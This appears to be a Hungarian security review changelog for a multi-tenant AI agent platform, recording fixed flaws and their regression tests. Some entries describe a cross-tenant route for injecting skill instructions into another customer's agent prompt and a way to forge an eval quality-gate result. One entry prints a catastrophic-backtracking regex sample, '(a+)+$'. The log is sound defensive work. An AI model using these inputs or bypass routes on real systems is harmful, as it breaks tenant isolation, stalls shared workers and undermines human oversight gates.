  - `app/src/app/actions/skills.ts` (a szerver-akciók: `assignSkillAction`, `unassignSkillAction`, `setSkillEnabledAction`, `getAgentSkillsAction`, `listAssignableSkillsAction`)
  - Kontextusban: `app/src/lib/skill/skill-scope.ts` (skill-olvashatóság), `app/src/lib/tenant-reachability.ts` / `app/src/lib/agent-tenant-access.ts` (a platform egységes agent-elérhetőségi határa), `app/src/lib/agent-detail-page-data.ts` (a másik, már tenant-scope-olt hívó).
- Eredmény — ami RENDBEN van: a katalógus-oldali tenant-scope fail-closed (`isSkillReadableFromTenant` / `isSkillWritableFromTenant` — idegen tenant skillje sosem olvasható/írható, global skillt csak platform-admin ír); az `importSkillMd` / `createSkill` a hardcoded validátoron megy át (kód-jelenlét → T2/T3 elutasítás, injection-tiltás); a verzió-jóváhagyás aláír (hash-lánc) és auditál; az agent-detail oldal (`agent-detail-page-data.ts`) a skillek listáját már tenant-szűrt `findByIdForDisplay(agentId, activeTenantId)` + gráf-access-check MÖGÜL tölti; a `distillFromConversation` a beszélgetés `findByIdForTenant` kapuján és a `conversation.agentId === agentId` egyezésen keresztül tenant-kötött.
- **Lelet #1 (kritikus, biztonsági — cross-tenant agent-manipuláció):** a skill→agent kötő szerver-akciók a kliens által küldött `agentId`-t **ellenőrzés nélkül** fogadták — sem az akció, sem a `SkillService` nem kötötte a cél-agentet a hívó AKTÍV tenantjához. A `requireTenantRole('admin'/'operator')` csak a hívó szerepét igazolja a saját tenantjában, azt NEM, hogy a megadott agent az övé. A `SkillService.assign` kizárólag a *skill* olvashatóságát (`isSkillReadableFromTenant`) és a verzió `active` státuszát vizsgálta; az `unassign` / `setEnabled` semmilyen tenant-ellenőrzést nem végzett. Így egy A-tenant admin:
  - egy **global** vagy saját skillt egy **B-tenant agentjének** UUID-jára írva idegen agent futásidejű promptjába injektált puha instrukciót (`assign`) — cross-tenant prompt-injektálási vektor;
  - egy B-tenant agent skilljeit **levehette** (`unassign`) vagy **ki/bekapcsolhatta** (`setEnabled`) — idegen agent viselkedésének rongálása / rendelkezésre-állás elleni támadás;
  - a `getAgentSkillsAction` (operator) / `listAssignableSkillsAction` (admin) egy **idegen agent** teljes skill-listáját és készültségét (readiness) olvasta ki — cross-tenant információ-szivárgás.
  - Kihasználási lánc: az egész kizárólag a támadó saját control-plane felületén elérhető akciókkal, csak a cél-agent UUID-jának ismeretében kivitelezhető volt. Ugyanaz a tenant-határ osztály, mint a Tool Broker / KB / Eval esetében (`isAgentReachableFromTenant`), csak a skill-belépőn eddig teljesen hiányzott.
- Javítás (defense-in-depth, két rétegben, a platform bevett `isAgentReachableFromTenant` szemantikájával — a megosztott, `tenantId === null` platform-agent elérhető, más tenant agentje SOSEM):
  - **Domain (choke-point):** a `SkillService` mostantól egy agent-feloldót (`SkillAgentLookup`, DI-vel a `repositories.agents`) kap, és minden agent-célzó írás (`assign` / `unassign` / `setEnabled`) az elején `assertAgentReachable(agentId, actor)`-t hív. A `setEnabled` kötelező `actor`-t kap (korábban egyáltalán nem volt kontextusa). Idegen/nem létező agent → opak `SkillAccessError('Agent not found')` (nem felderítési orákulum). Így egy jövőbeli új hívó sem tudja megkerülni.
  - **Audit (nem néma elutasítás):** a tenant-sértés — a `training-service` mintáját követve — `skill.access_denied` (`tenant_mismatch`) audit-sort hagy (az esemény már a kötelező event-katalógusban regisztrált), mert egy idegen agent-UUID-vel próbálkozó művelet a cross-tenant szondázás legerősebb korai jele.
  - **Akció-réteg:** a két olvasó akció (`getAgentSkillsAction`, `listAssignableSkillsAction`) az agentet a közös `assertAgentInTenant` őrön oldja fel, amely a reachability-döntést a platform-egységes `assertAgentTenantReachable` helperre delegálja (egy forrás, egy igazság); a `setSkillEnabledAction` pedig továbbadja az `actor`-t.
  - Regressziós tesztek a már CI-be kötött `skill-catalog.test.ts`-be (6 új eset): `assign`/`unassign`/`setEnabled` idegen tenant agentjére → `Agent not found` és NINCS mellékhatás (nincs kötés/törlés/állapotváltás), plusz a cross-tenant `assign` `skill.access_denied` (`tenant_mismatch`) audit-sort hagy; nem létező agent → ugyanaz (nincs orákulum); saját tenant + global skill → sikeres; megosztott platform-agent → elérhető, sikeres.
- Kód-review (a `/code-review` skill két tengelye): **Standards** — nincs dokumentált hard violation; a review három judgement-call leletét bedolgoztam: (a) az elutasítás ne legyen néma → `skill.access_denied` audit a `training-service` mintájára; (b) az akció-helper duplikáció → a közös `assertAgentTenantReachable`-re delegál; (c) a `SkillAgentLookup` fölösleges `tenantId?` paramétere törölve (speculative generality). **Spec** — a `skill-catalog-spec.md` a tenant-határt a *skill* (§D8) oldalán mondja ki explicit módon, a *cél-agent* elérhetőségét nem; a javítás ezért a spec „fail-closed tenant-határ, KB/tool-broker minta szerint" (§5) általános elvének hézagpótlása, nem eltérés — nincs hiányzó vagy hibásan implementált spec-követelmény, és nincs scope creep.
- Üzleti hatás: a skill az agent viselkedésének testreszabása — puha munkautasítás plusz az agenthez engedélyezett eszköz-igény. E hiba mellett egy ügyfél üzemeltetője — kizárólag a saját felületén — egy MÁSIK ügyfél agentjének viselkedésébe írhatott (idegen instrukció injektálása), abból eltávolíthatott képességeket, vagy kiolvashatta, milyen skillekkel dolgozik. Ez a többbérlős izoláció alapszabályát töri, és egyben cross-tenant prompt-injektálási csatorna. A javítás visszaállítja a „csak a saját (vagy megosztott) agenteddel dolgozhatsz" invariánst — aktiváláskori kötéskor ÉS minden olvasáskor.
- Ellenőrzés: `npm run test:skill-catalog` — teljes skill-suite zöld (6 új eset is); `npx tsc --noEmit` — teljes fa zöld (a `setEnabled` kötelező `actor`-ja minden hívónál kikényszerítve); az érintett fájlokra `eslint` zöld.
- Nyitott / követendő (nem-cél ebben a PR-ben):
  - **(1) Megosztott platform-agent írása tenant-adminként (governance, közepes):** az `isAgentReachableFromTenant` a megosztott (null-tenant) agentet minden tenantból elérhetővé teszi — konzisztensen a Tool Broker / Eval mintával. Egy tenant-admin így egy MEGOSZTOTT agent skilljeit is módosíthatja, ami az összes bérlőre hat. A kritikus (idegen *privát* agent) rést a fix teljesen zárja; a megosztott-agent-írás jogosultsági finomítása (pl. csak platform-admin) külön policy-döntés.
  - **(2) Korai (kötéskori) validáció hiánya:** a `unassign` egy tetszőleges `skillVersionId`-t is elfogad idempotensen; a hozzárendelt skill és a cél-agent egyezését a repo dönti el. Nem biztonsági rés (az agent-tenant kapu véd), de jobb hibaüzenetet adna.

## 2026-07-30 - Contract Runtime: Playbook content-check ReDoS / fail-closed konfigurációs kapu

- Áttekintett modulok (a strukturált AI-kimenet közös, több üzleti funkció által használt kontrollpontja — ezt a komponens-családot a napló korábban még nem fedte):
  - `app/src/domain/contract-runtime/**` — contract-fordítás, alaki/tartalmi validáció, szigorú javító kör, modell-kapus ítélet és audit-metrikák.
  - `app/src/lib/playbook-v2/spec.ts`, `step-output-inference.ts`, `output-contract-form.ts` — a Playbook-szerző által tárolt output-contract és annak futásidejű lefordítása.
  - Hívói kontextusban: `general-task-runtime.ts`, `playbook-author-agent.ts`, `skill-distiller-agent.ts`, `skill-review-agent.ts`, `wiki-runtime.ts`, `provisioning-assistant.ts`.
  - Összevetési minta: `app/src/domain/file-editor/safe-pattern.ts` és `file-search-safe-pattern.test.ts` (a már bevált, agent-bemenetű regex ReDoS-védelem).
- Eredmény — ami rendben van: az alaki contract strict Zod-sémával zár, az L3 kritikus lépés nem kap automatikus javító modellhívást, a content-only hiba nem indít felesleges „javítást”, az érzékeny tartalom a jóváhagyott modellre esik vissza, és a Folyamat-runtime a tartós contract-sértést determinisztikusan emberi felülvizsgálatra tereli.
- **Lelet #1 (magas, rendelkezésre állás — Playbookból indítható regex ReDoS):** a `contentCheck.kind = pattern` a Playbook admin által tárolt `regex` értéket közvetlenül `new RegExp(...).test(...)`-tel futtatta az agent kimenetén. Sem a Playbook-spec mentése/publikálása, sem a runtime nem korlátozta a mintát vagy tiltotta a katasztrofális visszalépést. A `'(a+)+$'` például egy `aaaa...!` kimeneten egyetlen Node eseményhurkot blokkolhat; a worker közös, ezért ez nem csak a saját folyamatát, hanem más tenantok futásait is késleltetheti (CWE-1333).
- **Lelet #2 (integritás — hibás contentCheck némán kieshetett):** a laza output-contract beolvasó ismeretlen/hibás `contentCheck`-et eldobott. Mivel az output-contract Zod-szinten tetszőleges JSON-record volt, egy hibás mintaszabályból publikálható Playbookban ténylegesen „nincs tartalmi kapu” lehetett volna — nem közérthető konfigurációs hiba.
- Javítás:
  - Új közös `app/src/lib/safe-regex.ts` védi a konfigurációból futó regexeket: 1000 karakteres plafon, a beágyazott nyitott kvantor és az ismételt alternáció ReDoS-családjainak futás ELŐTTI elutasítása, egységes hibatípus.
  - A Contract Runtime a minta futtatása előtt ugyanezt a védelmet hívja, és bármilyen régi/megkerülő konfigurációt fail-closed tartalmi hibává alakít — nincs modellhívás és nincs regex-végrehajtás.
  - A Playbook-spec `superRefine` kaput kapott: hibás, üres vagy veszélyes `contentCheck` nem menthető/publikálható; a szerző rögtön a konkrét konfigurációs hibát kapja.
  - A korábbi, fájlkeresési ReDoS-őr ugyanarra a közös policyre került, így a két agent-vezérelt regex-felület nem tud eltérő biztonsági szabályt kialakítani.
- Üzleti hatás: a kimeneti contract arra szolgál, hogy egy AI-válasz biztonságosan automatikus üzleti lépéssé válhasson. E hiba mellett egy rosszul konfigurált vagy kompromittált Playbook ugyan nem adatot szivárogtatott volna, de az automatizált munkafolyamatok közös végrehajtását állíthatta volna meg — például jóváhagyási, számla- vagy ügyfélszolgálati folyamatokat. A javítás a konfiguráció elfogadásakor megállítja a veszélyes szabályt, futáskor pedig második védelmi vonalat ad a már létező adatokra.
- Ellenőrzés:
  - `DATABASE_URL=postgresql://stub:stub@127.0.0.1:5432/stub node --import tsx scripts/contract-runtime.test.ts` — zöld, 2 új regresszióval: a veszélyes minta gyorsan, modellhívás nélkül bukik; Playbook-specbe sem menthető.
  - `node --import tsx scripts/output-contract-form.test.ts` és `node --import tsx scripts/file-search-safe-pattern.test.ts` — zöld.
  - célzott `eslint` és `git diff --check` — zöld.
  - `npx tsc --noEmit` a nem kapcsolódó, már meglévő Skill Catalog hibákon áll meg: `scripts/skill-catalog.test.ts` (2× argumentumszám) és `src/app/actions/skills.ts` (hiányzó `actor`).

## 2026-07-28 - Telegram-csatorna: élő jogosultság- és kill-switch kapuk a sorba állítástól a válaszig

- Áttekintett modulok: `channel-linking-service.ts`, `channel-turn-service.ts`, `channel-agent-access-service.ts`, az életciklus-gate és a kapcsolódó repository-k.
- **Kritikus lelet:** a kill-switch, a tagság-/tenant-státusz és a Telegram-agent-grant visszavonása nem volt következetesen élő a már sorba állított üzenet teljes útján. Így egy régi üzenet még modellfutást vagy Telegram-választ indíthatott, és egy leállított csatorna új üzenetet is sorba írhatott.
- Javítás: a linking út a tokenkiadás, tokenbeváltás és sorba írás előtt, a worker pedig minden tartós mellékhatás, modell utáni válasz és minden válasz-darab előtt újraellenőriz. Tiltáskor nincs kimenő adat, a forduló lezárul, az ok auditált.
- Üzleti hatás: a Telegram kikapcsolása és az agent-hozzáférés visszavonása valóban azonnali incidenskezelő eszköz; távozó vagy kompromittált fiók már sorban lévő kérése sem kaphat később üzleti választ.
- Ellenőrzés: `node --import tsx scripts/channel-turn.test.ts` (CT-1…CT-28), `node --import tsx scripts/channel-linking-service.test.ts` (CL-1…CL-17), teljes TypeScript, teljes ESLint (0 hiba) zöld.
- Kód-review: Standards — nincs hard violation; a session-írás előtti versenyablak javítva. Spec — a grant-revoke és többdarabos kimenet két P1 rése javítva; scope creep nincs.
- **Merge előtti felülvizsgálat (2026-07-29) — egy javított lelet:** a kapu eredetileg a hozzáférés OLVASÁSI hibáját (pl. pillanatnyi adatbázis-kiesés) ugyanúgy kezelte, mint egy kimondott tiltást: `markDone`, azaz a munkatárs üzenete némán, VÉGLEGESEN elveszett volna egy múló infrastruktúra-hiba miatt — pont az a néma elnyelés, amit a csatorna-spec tilt. A bizonytalanság most elkülönül a tiltástól (`ChannelAccessCheckError`): a forduló újrapróbálható marad (D8), és csak a próbálkozások kimerülése után lesz `failed`. A fail-closed garancia sértetlen — bizonytalan jogosultságnál egyetlen kimenő hívás sem megy ki, még a „nem sikerült feldolgozni" értesítés sem. Új tesztek: CT-24 (halasztás, néma) és CT-24b (kimerült próbálkozás, továbbra sem küld). Emellett a duplikált CT-16…CT-21 teszt-azonosítók feloldva (az új kapu-tesztek CT-23…CT-28, az audit-katalógus visszakapta az eredeti CT-15-öt).

## 2026-07-28 - Folyamat (Process) szerep→agent kötés: cross-tenant alkalmassági-kapu megkerülése

- Áttekintett modulok (a Folyamat-feature 2. szintje — az automatizált, triggerelhető agent-munkafolyamat definíció és futásidő. A naplóban eddig a Governed Flow Builder / Playbook v2 *compile* útja szerepelt, de a Folyamat-definíció REST-belépője, az aktiválási kapu és a futásidejű szereplő-feloldás tenant-határa nem):
  - `app/src/app/api/v1/process-definitions/**` (CRUD, `activate`, `archive`, `triggers`, `runs` — a szerep-alapú autorizáció: viewer/operator/approver/admin)
  - `app/src/domain/playbook/process-definition-service.ts` (`updateBindings`, `runActivationGate`, `checkBoundAgent`, `activate`)
  - `app/src/domain/playbook/process-service.ts` (`resolveAgentForRole`, `resolveUserForRole` — a futásidejű szerep→szereplő feloldás)
  - `app/src/domain/playbook/suitability.ts` (`isAgentSuitable` — a dokumentált tenant-invariáns tiszta függvénye)
  - Kontextusban: `app/src/repositories/postgres/agent-repository.ts` (`findById(id, tenantId?)`), `app/scripts/playbook-process-definition.test.ts`, Folyamat-feature-spec §4.8/§7.b.
- Eredmény — ami RENDBEN van: a REST-route-ok minden művelethez helyes szerep-kaput követelnek (`requireTenantRole`), és a `def`-szintű hozzáférés tenant-scope-olt (`requireDef` → `defs.findById(tenantId, id)`). A `detachTrigger` ellenőrzi, hogy a trigger a def-hez tartozik. Az aktiválás megelőző kapuval (alkalmasság + kötelező config-rés + human-permission) fut.
- **Lelet #1 (kritikus, biztonsági — cross-tenant agent-végrehajtás):** a szerep→agent kötés alkalmassági ellenőrzése a tenant-határt **az agent SAJÁT tenantjához** mérte, nem a Folyamatéhoz. A `checkBoundAgent` (aktiválási kapu) és a `resolveAgentForRole` (futásidő) egyaránt `isAgentSuitable(agent, role, agent.tenantId)` alakban hívott, holott a függvény harmadik paramétere a Folyamat tenantja (`defTenantId`) kell legyen. Így a beépített `agent.tenantId !== defTenantId` cross-tenant védelem `x !== x` alakúra egyszerűsödött, ami **mindig hamis → a védelem sosem lépett működésbe**. Ráadásul a `this.agents.findById(agentId)` hívás tenant-argumentum nélkül futott, tehát a DB-réteg sem szűrt tenantra. A `checkBoundAgent` a def valódi tenantját (`_tenantId`) tudatosan eldobta (aláhúzásos, „unused” paraméter).
  - Kihasználási lánc: egy A-tenant **operator** a `PATCH /api/v1/process-definitions/{id}` hívással a `roleBindings`-ba beírja egy **B-tenant agentjének** UUID-ját (a `updateBindings` nem validálja a kötött agent tenantját); egy A-tenant **approver** aktivál — a kapu átengedi (tenant-check no-op, a capability fedett); futáskor a `resolveAgentForRole` a B-tenant agentjét oldja fel és **B ügyfél agentjéhez rendel A-tenant ticketet** (a step `assignedAgentId` és a ticket `agentId` is a B-agentre mutat). A dokumentált §4.8 invariáns („AZONOS tenant a Folyamattal") csendben sérült.
- Javítás:
  - Mindkét hívási hely a **Folyamat/Futás tenantját** adja át `isAgentSuitable` harmadik argumentumaként (`process-definition-service.ts`: a `checkBoundAgent` most `defTenantId`-t kap és továbbít; `process-service.ts`: a `resolveAgentForRole` a Futás `tenantId`-jét adja). Ezzel a beépített tenant-mismatch check újra elbukik idegen-tenant agentnél, informatív okkal („Az agent másik tenanthez tartozik, mint a Folyamat"). A platform-szintű (null-tenant) agent továbbra is csak null-tenant Folyamathoz köthető — a spec szerint.
  - Determinisztikus regressziós tesztek a meglévő, már CI-be kötött `playbook-process-definition.test.ts`-be (nem kellett új CI-bekötés): (a) az aktiválási kapunál idegen-tenant, aktív, capability-fedő agent → `AGENT_UNSUITABLE`; (b) futásidőben ugyanez → a Futás `blocked` + `process.blocked` audit, és **nem keletkezik cross-tenant ticket**. A teszt valódiságát igazoltam: a régi (agent-tenant) argumentummal az (a) eset elbukik.
- Üzleti hatás: egy Folyamat automatizált munkát oszt ki agenteknek, akár ütemezetten (monitor-cron), ember nélkül. E hiba mellett egy tenant üzemeltetője — kizárólag a saját felületén elérhető műveletekkel — egy másik ügyfél agentjét futtathatta volna a saját folyamatában, és annak az agentnek a jogosultságaival, memóriájával, connectoraival hajtatott volna végre munkát; a másik ügyfél oldalán pedig idegen ticket jelent volna meg. Ez a többbérlős (multi-tenant) izoláció alapszabályát töri — pontosan az a garancia, amit egy enterprise platformnak élesben tartania kell. A javítás visszaállítja a „csak a saját tenantod agentje köthető" invariánst az aktiváláskor ÉS minden egyes futáskor (defense-in-depth: a kötés utólag is inaktívvá/idegenné válhat).
- Ellenőrzés: `npm run test:playbook-process-def` — teljes Folyamat-suite zöld (2 új eset is); `npx tsc --noEmit` — teljes fa zöld; `npx eslint` az érintett fájlokra zöld.
- Nyitott / követendő (nem-cél ebben a PR-ben):
  - **(1) UGYANEZ AZ OSZTÁLY az emberi (`human_role`) oldalon — külön feladat, mert a naiv fix HIBÁS lenne.** A `resolveUserForRole` (`process-service.ts`) a `roleBindings`-ből konkrét usert old fel, `this.users.findById(userId)`-t hív tenant-szűrő NÉLKÜL, és a ticket `assigneeId`-jét erre a userre állítja — így egy operator idegen-tenant `userId`-t írva cross-tenant emberi ticketet oszthat ki. FONTOS: a triviális `user.tenantId === defTenantId` ellenőrzés **nem jó**, mert a `user.tenantId` csak a user *alapértelmezett* tenantját tükrözi (lásd `tool-broker-service.ts` kommentjét); a valódi tagságot a membership-modell dönti el (`lib/tenant-policy.ts` `memberships.find(m => m.tenantId === target)`). A korrekt javítás egy membership-lekérdezést (új repo-függőség a `ProcessService`-be) igényel, ezért tudatosan külön PR — a naiv egyenlőség megtörné a más alap-tenantú, de tag-userek legitim kötését. (A Folyamat-spec §7.b v1-modellje egyébként `assigneeId = null`-t ír elő emberi lépésre; a kód ezen már túlmegy, tehát a tenant-izolációt is neki kell tartania.)
  - **(2) Defense-in-depth (alacsony):** a `checkBoundAgent`/`resolveAgentForRole` `this.agents.findById(agentId)` ma is tenant-argumentum nélkül tölti be a sort — a `findById(id, tenantId?)` támogatná a query-szintű szűrést is. A rést az `isAgentSuitable` tenant-check már teljesen zárja (ez a dokumentált egyetlen kapu), de a lekérdezés-szintű szűrés extra réteg lenne, ha valaki később átírja a suitability-t.
  - **(3)** Az `updateBindings` egyáltalán nem validálja kötéskor a kötött agent/user tenantját — jelenleg csak az aktiválási és futásidejű kapu véd; a korai (kötéskori) validáció jobb hibaüzenetet adna az operátornak.

## 2026-07-29 - Eval / Governance: eval↔agent kötés-őr és tenant-kapu a minőségi kapun

- Áttekintett modulok (az agent-önfejlesztés / tanítás-jóváhagyás „minőségi kapuja" — a korábbi napló a persistent-memory, training és memory-approval tenant-határát fedte, de magát az EvalService-t és az eval control-plane belépőpontjait nem):
  - `app/src/domain/eval/eval-service.ts` (a golden-set kiértékelő mag: `run`, `findActiveForAgent`, `findAllForAgent`, `create`)
  - `app/src/app/actions/platform.ts` eval szerver-akciói: `createEval` (admin), `runEval` (approver), `listEvalsForAgent` (viewer)
  - A két belső hívó: `app/src/domain/memory/memory-approval-service.ts` és `app/src/domain/training/training-service.ts` (`pre_training_approval` trigger)
  - Kontextusban: `app/src/lib/tenant-reachability.ts`, `app/src/lib/validators/actions.ts` (`createEvalSchema`, `runEvalSchema`), `prisma/schema.prisma` (`Eval`/`EvalRun` — nincs saját `tenantId`, a scope az agenten át horgonyzódik).
- Eredmény — ami RENDBEN van: az RBAC-létra a három akción konzisztens (admin/approver/viewer); a két belső hívó az evalt `findActiveForAgent(agent.id)`-ből oldja fel, tehát az eval és az agent eleve összetartozik; a golden-set assertion-motor (contains/not_contains/min_length) determinisztikus, nincs injekciós felület; nincs eval REST API-route és a `scheduled` triggernek nincs élő hívója (nincs rejtett belépőpont).
- **Lelet #1 (kritikus, biztonsági — cross-tenant eval-hozzáférés):** a `createEval` / `runEval` / `listEvalsForAgent` szerver-akciók a kliens által megadott `agentId`-t ellenőrzés nélkül fogadták — a hívó AKTÍV tenantjához való elérhetőség NEM volt kikényszerítve. Így egy tenant-admin/approver/viewer egy MÁSIK tenant agentjére hozhatott létre, futtathatott vagy listázhatott evalt: az idegen agent evaljainak létezése és golden-setjének eredménye kiszivárgott, illetve idegen agenten keletkezett audit-nyomú `EvalRun`. Ugyanaz a tenant-határ osztály, mint a Tool Broker / KB / training esetében (`isAgentReachableFromTenant`), csak az eval-belépőn eddig hiányzott.
- **Lelet #2 (kritikus, integritás — eval↔agent kötés hiánya):** az `EvalService.run` az evalt csak `evalId` alapján kereste, és a hívó által megadott `agentVersion`-t **ellenőrzés nélkül** írta metaadatként az `EvalRun`-ba. A `runEval` akció viszont az `evalId`-t és az `agentId`-t EGYMÁSTÓL FÜGGETLENÜL vette a klienstől. Így „A" agent (enyhébb golden-setű) evalja lefuttatható volt, és az eredmény „B" agent `agentVersion`-jével, „B" minőségi kapujának eredményeként dokumentálódott — a tanítás-jóváhagyási úton egy hamis „átment a kapun" bizonyíték. A minőségi kapu megkerülhető/hamisítható volt.
- Javítás:
  - `EvalService.run` mostantól kötelező `agentId` paramétert kap, és fail-closed elutasít (`Eval not found`, EvalRun NEM jön létre), ha `evalDef.agentId !== agentId`. A hamis-kapu rekord keletkezése lehetetlen.
  - Mindhárom eval szerver-akció az agentet `findById` + `assertAgentTenantReachable(agent, activeTenantId)` úton oldja fel az aktív tenant-kontextusból; cross-tenant agent opak `Agent not found` (nem felderítési orákulum), megosztott (`tenantId === null`) platform-agent elérhető marad. A `runEval` a szolgáltatásnak a feloldott `agent.id`-t adja (nem a nyers kliens-inputot).
  - A közös invariáns kiszervezve: `app/src/lib/agent-tenant-access.ts` (`assertAgentTenantReachable`) — a `platform.ts`-ben addig egyedi másolat volt; egy forrás, egy igazság a Tool Broker/KB mintájával.
  - `EvalService` konstruktor-DI (`Pick<typeof prisma,'eval'|'evalRun'>`, alap = `prisma`) — visszafelé kompatibilis, a DB-mentes regressziós teszthez.
- Üzleti hatás: az eval a platform „megjelenhet-e élesben ez az agent-változtatás" kapuja. A #2 nélkül ez a kapu hamisítható lett volna — egy laza evallal átvitt tartalom úgy jelenne meg, mintha egy szigorú minőségi ellenőrzésen ment volna át, ami az egész önfejlesztés-jóváhagyás bizalmát aláássa. A #1 pedig ügyfél-elszigetelést sértett: egy tenant belelátott/beleírt egy másik ügyfél agentjének minőségi kapujába. A javítás után az eval szigorúan az adott agenthez és tenanthoz kötött.
- Ellenőrzés: `npm run test:eval-service` (7/7 zöld — tenant-kapu, kötés-őr fail-closed, golden-set pass/fail/üres eset); `npm run test:memory-approval` és `npm run test:training-tenant` zöld (a `run`-hoz átadott `agentId` nem okoz regressziót); `npx tsc --noEmit` a teljes fán zöld (a kötelező `agentId` minden hívónál kikényszerítve).
- Kód-review (a `/code-review` skill két tengelye): **Standards** — nincs dokumentált hard violation; a review során felszínre került teszt-duplikáció és stílus-eltérés (két teszt-fájl, egyik `node:test`, másik kézi runner) egy fájlba konszolidálva a repo bevett kézi-runner mintájában. **Spec** — mindhárom invariáns (kötés / tenant-kapu / fail-closed) teljesül, nincs scope creep a testable-seam DI-n túl, és nincs megkerülő belépőpont (a `run` egyetlen choke-point).
- Utólagos specifikációs kontroll és javítás: az `eval_only` / `auto_after_eval` profil sikertelen evalját korábban az `overrideEval` még átvihette volna; ez most fail-closed, a ticketet rendszer-aktor `rejected` állapotba teszi, write-gate és memória-promóció nélkül. A `createEval` / `runEval` / `listEvalsForAgent` audit-eseményei a kötelező event-katalógusba is bekerültek, ezért nincs „művelet már megtörtént, audit miatt hibás válasz" félállapot. A kötelező system-rejection átmenet a meglévő, testreszabott ticket-konfigurációban is felülírja a túl szűk `operator` szabályt; ez a hard governance-garancia nem admin-hangolható ki. Új `training-eval-policy.test.ts` 8/8 esettel védi az override-, audit-regisztráció- és konfigurációs invariánsokat.
- Nyitott / követendő (nem-cél ebben a PR-ben): az evalnak nincs kitett deaktiválási/törlési akciója (a gate csak `overrideEval`-lal kerülhető meg a jóváhagyáskor) — funkcionális hiányosság, nem biztonsági; a golden-set assertion-készlet szűk (contains/not_contains/min_length), gazdagabb kiértékelőt a Prompt-eval harness spec (#35) céloz.

## 2026-07-28 - Folyamat (Process) szerep→USER kötés: cross-tenant emberi ticket-kiosztás (a #153 follow-up (1))

- Kontextus: a #153 (`fix/process-role-binding-cross-tenant`) lezárta az AGENT-oldali cross-tenant alkalmassági-kaput (`isAgentSuitable(agent, role, defTenantId)` — a tenant-határt a Folyamat tenantjához méri, nem a szereplő sajátjához). Az ott naplózott **follow-up (1)** pont írta le, hogy UGYANEZ AZ OSZTÁLY nyitva maradt az EMBERI (`human_role`) oldalon, és hogy a naiv `user.tenantId === defTenantId` fix HIBÁS lenne. Ez a bejegyzés ezt a follow-upot zárja.
- Áttekintett modulok:
  - `app/src/domain/playbook/process-service.ts` (`resolveUserForRole`, `createStepWithTicket`) — a futásidejű emberi szereplő-feloldás és a ticket `assigneeId` / step `assignedUserId` beállítása.
  - `app/src/domain/playbook/process-definition-service.ts` (`runActivationGate` human-ág) — az aktiválás-kori megelőző kapu.
  - Referencia-minták: `app/src/domain/playbook/suitability.ts` (agent-oldali tenant-kapu), `app/src/lib/tenant-policy.ts` (`memberships.find(m => m.tenantId === target)`), `app/src/domain/tool-broker/tool-broker-service.ts` (~432. sor komment: a `user.tenantId` csak a user *alapértelmezett* tenantja).
- **Lelet (kritikus, biztonsági — cross-tenant emberi ticket-kiosztás):** a `resolveUserForRole` a Folyamat `roleBindings`-jéből konkrét `userId`-t oldott fel `this.users.findById(userId)`-val, **tenant-szűrő nélkül**, és a keletkező emberi ticket `assigneeId`-jét (valamint a step `assignedUserId`-jét) erre a userre állította. Egyetlen státusz/role ellenőrzés futott (`active` + van szerepe), tenant-tagság NEM. Így egy A-tenant operátora, aki a Folyamatot szerkeszti/aktiválja, egy B-tenant `userId`-t beírva **B-tenant felhasználójának osztott ki emberi lépés-ticketet A-tenant folyamatából** — jóváhagyási/beavatkozási feladatot idegen szervezet tagjának, az A-tenant adataival a payloadban. Az `runActivationGate` human-ága ugyanezt engedte át (csak status/role/permission, tenant-tagság nem), így a rés már az aktiválási kapun sem akadt fenn.
- Miért volt HIBÁS a naiv fix: a `user.tenantId` oszlop csak a user *alapértelmezett* tenantját tükrözi. Egy user több tenant aktív tagja lehet (membership-modell), és egy más alap-tenantú, de a Folyamat tenantjához LEGITIM módon meghívott tag kötése érvényes kell maradjon. A `user.tenantId === defTenantId` egyenlőség ezeket a jogos kötéseket tévesen elutasította volna, miközben a valódi tenant-határt nem is a `user.tenantId` jelenti.
- Javítás:
  - Új tiszta, DB nélkül tesztelhető helper: `app/src/domain/playbook/human-role-suitability.ts` `isHumanUserSuitable(user, membership, defTenantId)` — az agent-oldali `isAgentSuitable` emberi párja. Kapu: (1) a user `active` és van platform-szerepe; (2) VALÓS (nem-null) Folyamat-tenantnál a user a MEMBERSHIP-modell szerint AKTÍV tagja a Folyamat tenantjának; (3) null (platform) Folyamatnál nincs tagság-fogalom → csak a status/role kapu él (paritás azzal, ahogy `isAgentSuitable` a null scope-ot önmagával egyezteti).
  - A tagságot a `TenantMembershipRepository.findByTenantAndUser(defTenantId, userId)` dönti el — új konstruktor-függőség a `ProcessService`-ben (opcionális, de valós tenantnál FAIL-CLOSED: membership-repo hiányában blokkol, nem old fel ellenőrizetlenül) és a `ProcessDefinitionService`-ben (kötelező). Bekötve a `domain/index.ts` composition rootban (`repositories.tenantMemberships`).
  - A futásidejű feloldás a step/ticket létrehozása ELŐTT fut (mint az agentnél), így cross-tenant kötésnél nem marad részleges rekord: `ProcessBlockedError` → a hívó `blocked`-be viszi + `process.blocked` audit (néma megállás nincs).
- Üzleti hatás: egy Folyamat-szerkesztő csak a SAJÁT szervezetének tagjaira oszthat ki emberi lépést; nem tud idegen tenant felhasználójának jóváhagyási/beavatkozási feladatot (és vele a folyamat payloadját) átadni. A legitim, több-tenantos tagságú felhasználók kötése ettől érintetlen marad.
- Ellenőrzés: `node --import tsx scripts/playbook-process-definition.test.ts` — teljes suite zöld, benne 5 új eset (aktiválási kapu: nem-tag idegen user → `HUMAN_USER_UNSUITABLE`, más-alap-tenantú TAG → nincs violation, felfüggesztett tagság → `HUMAN_USER_UNSUITABLE`; futásidő: nem-tag → `blocked`+nincs ticket, más-alap-tenantú TAG → ticket a TAG userhez). `npx tsc --noEmit` a teljes fára zöld; `eslint` az érintett fájlokra zöld; `git diff --check` tiszta. A teszt már CI-be kötött (`test:playbook-process-def` a `ci.yml`-ben), az új esetek automatikusan futnak.
- Merge előtti független ellenőrzés (a #159 rebase-e a #153 utáni `main`-re): a kapu egyetlen choke-pointon ül (a `resolvedUserId` kizárólag a `createStepWithTicket`-en át kerül a step `assignedUserId`-jébe és a ticket `assigneeId`-jébe — nincs megkerülő írási út). A tesztek valódiságát mutációval igazoltam: a membership-ág kikapcsolásával a 3 negatív eset (aktiválási kapu nem-tag / felfüggesztett tagság, futásidejű nem-tag) elbukik, tehát nem vakon zöldek. Kiegészítés a review során: az aktiválási kapu membership-betöltése soros `await`-ciklus helyett `Promise.all` (a szerepenkénti N+1 kör helyett egy kör; viselkedés változatlan). Teljes `npm run lint` 0 error, `npx tsc --noEmit` zöld, a `test:playbook-process-def`, `test:playbook-v2-process` és `test:playbook-lifecycle` suite-ok zöldek.
